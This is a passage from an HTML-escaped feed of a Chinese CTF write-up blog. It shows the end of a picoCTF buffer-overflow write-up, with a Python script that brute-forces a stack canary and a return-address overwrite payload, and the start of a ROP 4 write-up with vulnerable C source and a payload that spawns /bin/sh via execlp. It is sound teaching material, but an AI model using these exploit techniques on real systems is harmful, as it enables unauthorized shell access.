+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-22&quot; title=&quot;22&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x08048858 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;149&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;dv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;0x10,&lt;/span&gt;%&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-23&quot; title=&quot;23&quot;&gt;                        ...&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-24&quot; title=&quot;24&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080488b1 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;238&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;leave&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-25&quot; title=&quot;25&quot;&gt;&lt;span class=&quot;bn&quot;&gt;   0x080488b2 &lt;/span&gt;&amp;lt;+&lt;span class=&quot;dv&quot;&gt;239&lt;/span&gt;&amp;gt;:   &lt;span class=&quot;bu&quot;&gt;ret&lt;/span&gt;&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;canary&lt;/code&gt; 在 &lt;code&gt;$ebp - 0x10&lt;/code&gt;，&lt;code&gt;buf&lt;/code&gt; 在 &lt;code&gt;$ebp - 0x30&lt;/code&gt;，因此中间有 &lt;code&gt;0x20 = 32&lt;/code&gt; 个字节。我们可以不断地执行这段程序，每次都覆盖 33 个字节，通过改变最后一个字节就可以根据程序输出暴力猜测出 &lt;code&gt;canary&lt;/code&gt; 的第一个字节的值。然后以此类推，就可以猜出第 2、3、4 个字节。&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; subprocess &lt;span class=&quot;im&quot;&gt;as&lt;/span&gt; sp&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-2&quot; title=&quot;2&quot;&gt;flag &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;True&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-3&quot; title=&quot;3&quot;&gt;canary &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; []&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;cf&quot;&gt;for&lt;/span&gt; canary_index &lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;range&lt;/span&gt;(&lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;):&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-5&quot; title=&quot;5&quot;&gt;    i &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-6&quot; title=&quot;6&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;while&lt;/span&gt; flag:&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-7&quot; title=&quot;7&quot;&gt;        p &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; sp.Popen(&lt;span class=&quot;st&quot;&gt;&amp;quot;/problems/buffer-overflow-3_3/vuln&amp;quot;&lt;/span&gt;, stdin&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;sp.PIPE, std&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-8&quot; title=&quot;8&quot;&gt;out&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;sp.PIPE, stderr&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;sp.PIPE, bufsize&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;, cwd&lt;span class=&quot;op&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;/problems/buffer-overflow-3_3&amp;quot;&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-9&quot; title=&quot;9&quot;&gt;        p.stdin.write(&lt;span class=&quot;bu&quot;&gt;str&lt;/span&gt;(&lt;span class=&quot;dv&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;+&lt;/span&gt;canary_index) &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;)                                                            &lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-10&quot; title=&quot;10&quot;&gt;        p.stdin.write(&lt;span class=&quot;st&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(canary) &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;chr&lt;/span&gt;(i) &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-11&quot; title=&quot;11&quot;&gt;        o &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; p.stdout.read()&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-12&quot; title=&quot;12&quot;&gt;        &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Stack Smashing Detected&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; o:&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-13&quot; title=&quot;13&quot;&gt;            &lt;span class=&quot;cf&quot;&gt;break&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-14&quot; title=&quot;14&quot;&gt;        i &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-15&quot; title=&quot;15&quot;&gt;        &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; i &lt;span class=&quot;op&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;256&lt;/span&gt;:&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-16&quot; title=&quot;16&quot;&gt;            &lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;error finding canary&amp;quot;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-17&quot; title=&quot;17&quot;&gt;            &lt;span class=&quot;cf&quot;&gt;break&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-18&quot; title=&quot;18&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-19&quot; title=&quot;19&quot;&gt;    &lt;span class=&quot;bu&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;hex&lt;/span&gt;(i)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-20&quot; title=&quot;20&quot;&gt;    canary &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; [&lt;span class=&quot;bu&quot;&gt;chr&lt;/span&gt;(i)]&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;执行后就可以打印出 canary 的值：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;dontpanic@pico-2018-shell:/tmp/overflow3$ python bf.py
+0x49
+0x48
+0x77
+0x6a
+dontpanic@pico-2018-shell:/tmp/overflow3$&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接下来就是常规的爆破了，看一下 &lt;code&gt;win&lt;/code&gt; 的地址：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(gdb) print win
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x80486eb &amp;lt;win&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-1&quot; title=&quot;1&quot;&gt;python &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;st&quot;&gt;&amp;quot;print &amp;#39;100&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39; + &amp;#39;0&amp;#39; * 32 + &amp;#39;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\x49\x48\x77\x6a&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;XXXXXXXXXXXX&amp;#39; + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xeb\x86\x04\x08\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-2&quot; title=&quot;2&quot;&gt;                                       ↑canary                          ↑ebp ↑返回地址&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">这道题模拟了栈溢出保护，但 canary 是固定的：</summary></entry><entry><title type="html">ROP 4</title><link href="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-4.html" rel="alternate" type="text/html" title="ROP 4" /><published>2019-02-26T00:00:00+00:00</published><updated>2019-02-26T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-4</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-4.html">&lt;p&gt;这道题是 PicoCTF 2013 ROP 系列的最后一题：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-4&quot; title=&quot;4&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; exec_string[&lt;span class=&quot;dv&quot;&gt;20&lt;/span&gt;];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-6&quot; title=&quot;6&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-7&quot; title=&quot;7&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; exec_the_string() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-8&quot; title=&quot;8&quot;&gt;    execlp(exec_string, exec_string, NULL);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-9&quot; title=&quot;9&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-10&quot; title=&quot;10&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-11&quot; title=&quot;11&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; call_me_with_cafebabe(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; cafebabe) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-12&quot; title=&quot;12&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (cafebabe == &lt;span class=&quot;bn&quot;&gt;0xcafebabe&lt;/span&gt;) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-13&quot; title=&quot;13&quot;&gt;        strcpy(exec_string, &lt;span class=&quot;st&quot;&gt;&amp;quot;/sh&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-14&quot; title=&quot;14&quot;&gt;    }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-15&quot; title=&quot;15&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-16&quot; title=&quot;16&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-17&quot; title=&quot;17&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; call_me_with_two_args(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; deadbeef, &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; cafebabe) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-18&quot; title=&quot;18&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (cafebabe == &lt;span class=&quot;bn&quot;&gt;0xcafebabe&lt;/span&gt; &amp;amp;&amp;amp; deadbeef == &lt;span class=&quot;bn&quot;&gt;0xdeadbeef&lt;/span&gt;) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-19&quot; title=&quot;19&quot;&gt;        strcpy(exec_string, &lt;span class=&quot;st&quot;&gt;&amp;quot;/bin&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-20&quot; title=&quot;20&quot;&gt;    }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-21&quot; title=&quot;21&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-22&quot; title=&quot;22&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-23&quot; title=&quot;23&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vulnerable_function() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-24&quot; title=&quot;24&quot;&gt;    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;128&lt;/span&gt;];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-25&quot; title=&quot;25&quot;&gt;    read(STDIN_FILENO, buf, &lt;span class=&quot;dv&quot;&gt;512&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-26&quot; title=&quot;26&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-27&quot; title=&quot;27&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-28&quot; title=&quot;28&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; be_nice_to_people() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-29&quot; title=&quot;29&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// /bin/sh is usually symlinked to bash, which usually drops privs. Make&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-30&quot; title=&quot;30&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// sure we don&amp;#39;t drop privs if we exec bash, (ie if we call system()).&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-31&quot; title=&quot;31&quot;&gt;    gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-32&quot; title=&quot;32&quot;&gt;    setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-33&quot; title=&quot;33&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-34&quot; title=&quot;34&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-35&quot; title=&quot;35&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;** argv) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-36&quot; title=&quot;36&quot;&gt;    exec_string[&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;] = &amp;#39;\&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;er&quot;&gt;&amp;#39;&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-37&quot; title=&quot;37&quot;&gt;    be_nice_to_people();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-38&quot; title=&quot;38&quot;&gt;    vulnerable_function();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-39&quot; title=&quot;39&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;首先 &lt;code&gt;file&lt;/code&gt; 一下这个程序：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;dontpanic@Ubuntu:~$ file rop4
+rop4: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=58db790a742bb1b283bc3301fa309bf5f4e23b27, not stripped&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;它是静态链接的、非位置无关的可执行文件，因此不会有 ASLR 的问题。&lt;code&gt;execlp&lt;/code&gt; 的原型如下：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; execlp(&lt;span class=&quot;dt&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; *file, &lt;span class=&quot;dt&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; *arg, ...);&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;第一个参数是文件路径，第二个参数是 &lt;code&gt;argv[0]&lt;/code&gt;，也就是程序名称。第二个参数比较随意，我们传入与第一个参数相同的字符串就可以了。这个函数还需要最终传入一个 &lt;code&gt;NULL&lt;/code&gt; 用来结尾。&lt;/p&gt;
+&lt;p&gt;下面要解决的就是 “/bin/sh” 应该如何构建。&lt;/p&gt;
+&lt;h4 id=&quot;使用现有的-binsh-字符串&quot;&gt;使用现有的 /bin/sh 字符串&lt;/h4&gt;
+&lt;p&gt;radare2 搜索一下就会发现，我们仍然有现成的 “/bin/sh” 可以利用：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[0x08048df8]&amp;gt; iz | grep bin/sh
+382 0x00083f4f 0x080cbf4f   7   8 (.rodata) ascii /bin/sh &lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因此可以直接构造出如下命令进行爆破：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb5-1&quot; title=&quot;1&quot;&gt;                                  ↓返回地址（call execlp）          ↓第二个参数（&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;sh）&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb5-2&quot; title=&quot;2&quot;&gt;(python &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;st&quot;&gt;&amp;quot;print &amp;#39;0&amp;#39;*0x88 + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xed\x8e\x04\x08\x4f\xbf\x0c\x08\x4f\xbf\x0c\x08\x00\x00\x00\x00\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;cat) &lt;span class=&quot;op&quot;&gt;|&lt;/span&gt; .&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;rop4&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb5-3&quot; title=&quot;3&quot;&gt;                             ↑ebp                 ↑第一个参数（&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;sh）            ↑第三个参数（NULL）&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4 id=&quot;构造出-binsh-字符串&quot;&gt;构造出 /bin/sh 字符串&lt;/h4&gt;
+&lt;p&gt;如果没有现成的字符串怎么办呢？也有办法，我们可以自行构造出 “/bin/sh”。首先 &lt;code&gt;call_me_with_two_args&lt;/code&gt; 中，已经向 &lt;code&gt;exec_string&lt;/code&gt; 拷贝了 &lt;code&gt;/bin&lt;/code&gt;；我们下面要做的就是在后面接上 &lt;code&gt;/sh&lt;/code&gt;，这可以通过调用 &lt;code&gt;strcpy&lt;/code&gt; 来实现；然后我们就可以直接调用 &lt;code&gt;exec_the_string&lt;/code&gt; 函数了。&lt;/p&gt;
+&lt;p&gt;首先看一下 &lt;code&gt;call_me_with_two_args&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode asm&quot;&gt;&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-1&quot; title=&quot;1&quot;&gt;/ (fcn) sym.call_me_with_two_args &lt;span class=&quot;dv&quot;&gt;45&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-2&quot; title=&quot;2&quot;&gt;|   sym.call_me_with_two_args (&lt;span class=&quot;bu&quot;&gt;int&lt;/span&gt; arg_&lt;span class=&quot;bn&quot;&gt;8h, &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;int&lt;/span&gt; arg_ch)&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-3&quot; title=&quot;3&quot;&gt;|           &lt;span class=&quot;co&quot;&gt;; arg int arg_8h @ ebp+0x8&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-4&quot; title=&quot;4&quot;&gt;|           &lt;span class=&quot;co&quot;&gt;; arg int arg_ch @ ebp+0xc&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-5&quot; title=&quot;5&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x08048f0e      &lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;55&lt;/span&gt;             &lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-6&quot; title=&quot;6&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x08048f0f      &lt;/span&gt;&lt;span class=&quot;fl&quot;&gt;89e5&lt;/span&gt;           &lt;span class=&quot;bu&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-7&quot; title=&quot;7&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x08048f11      &lt;/span&gt;817d0cbebafe.  &lt;span class=&quot;bu&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [arg_ch], &lt;span class=&quot;bn&quot;&gt;0xcafebabe&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; [0xcafebabe:4]=-1&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-8&quot; title=&quot;8&quot;&gt;|       ,=&amp;lt;&lt;span class=&quot;bn&quot;&gt; 0x08048f18      &lt;/span&gt;751f           &lt;span class=&quot;bu&quot;&gt;jne&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt; 0x8048f39&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-9&quot; title=&quot;9&quot;&gt;|       |&lt;span class=&quot;bn&quot;&gt;   0x08048f1a      &lt;/span&gt;817d08efbead.  &lt;span class=&quot;bu&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;dword&lt;/span&gt; [arg_8h], &lt;span class=&quot;bn&quot;&gt;0xdeadbeef&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; [0xdeadbeef:4]=-1&lt;/span&gt;&lt;/a&gt;
